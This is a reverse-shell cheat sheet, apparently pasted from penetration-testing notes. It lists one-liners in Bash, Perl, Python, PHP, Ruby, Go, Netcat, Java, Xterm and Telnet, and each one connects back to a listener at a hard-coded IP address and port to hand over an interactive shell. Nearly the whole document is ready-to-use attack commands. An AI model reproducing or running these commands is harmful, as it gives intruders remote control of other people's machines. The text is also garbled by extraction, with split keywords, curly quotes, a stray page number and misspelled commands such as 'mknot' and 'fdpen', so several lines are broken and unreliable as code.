# Reverse Shells

- Bash

→ bash -i >& /dev/tcp/10.11.0.236/8080 0>&1
→ exec /bin/bash 0&0 2>&0
→ 0<&196;exec 196<>/dev/tcp/192.168.49.163/8080; sh <&196 >&192 2>&196
→ exec 5<>/dev/tcp/10.11.0.236/808; cat <&5 | w hile read line; do $ line 2>&5 >&5; done # or: w hile read line 0<&5; do $line 2>&5
>&5; done

- Perl

→ perl -e ‘use Socket;$i="10.11.0.87";$ p=8181;socket(S,PF _INET,SO C K_STREA M,getprotoby name("tcp"));if(connect(S,sockaddr_in
($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
→ perl -MIO -e ‘$ p=fork;exit,if($ p);$ c=new IO ::Socket::INET(PeerA ddr, “10.11.0.236:4567”);STDIN->fdopen($c,r);$~-
>fdpen($c,w);system$_ while<>;’
→ perl -MIO -e ‘$ c=new IO ::Socket::INET(PeerA ddr,"10.11.0.236:4567");STDIN->fdopen($ c,r);$~->fdopen($c,w );sy stem
$_ while<>;’

- Python

→ python -c ‘import socket,subprocess,os;s=socket.socket(socket.A F _INET,socket.SO C K_STREA M);s.connect(("10.11.0.87",4567));os.dup2
(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

- PHP

→ php -r ‘$socket=fsockopen(’10.11.0.236',8080);exec("/bin/sh -i <&3 >&3 2>&3");'

- Ruby

→ ruby -rsocket -e 'f=TC PSocket.open("10.11.0.236",8080).to_i;exec sprint("/bin/sh -i <&% d >&% d 2>&% d",f,f,f)'
→ ruby -rsocket -e ‘exit if fork;c=TC PSocket.new ("10.11.0.236","4567");w hile(cmd=c.gets);IO .popen(cmd,"r") {|io|c.print io.read}end’
114/117
→ ruby -rsocket -e' c=TC PSocket.new ("10.11.0.236","4567");w hile(cmd=c.gets);IO .popen(cmd,"r") {|io|c.print io.read}end'

- GOLANG

-> echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","0.0.0.0:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

- Netcat

→ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.49.163 8080 >/tmp/f

- Java

→ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev /tcp/192.168.49.90/8080;cat <75 | w hile read line; do \$line 2>&5
>&5; done"]; as String[]); p.waitFor()

- Xterm

→ xterm -display 10.11.0.236:1 (TC P port 6001) (Start an X-Serv er) (# Xnest :1) (You'll need to authorize the target to connect to y ou)
(# xhost +targetip, run on host)
- Telnet
→ rm -f /tmp/p; mknot /tmp/p p && telnet 10.11.0.236 4445 0/tmp/p
→ telnet 10.11.0.236 4444 | /bin/bash | telnet 10.11.0.236 4445 ## Remember to listen on y our rmachine also on port 4445/tcp
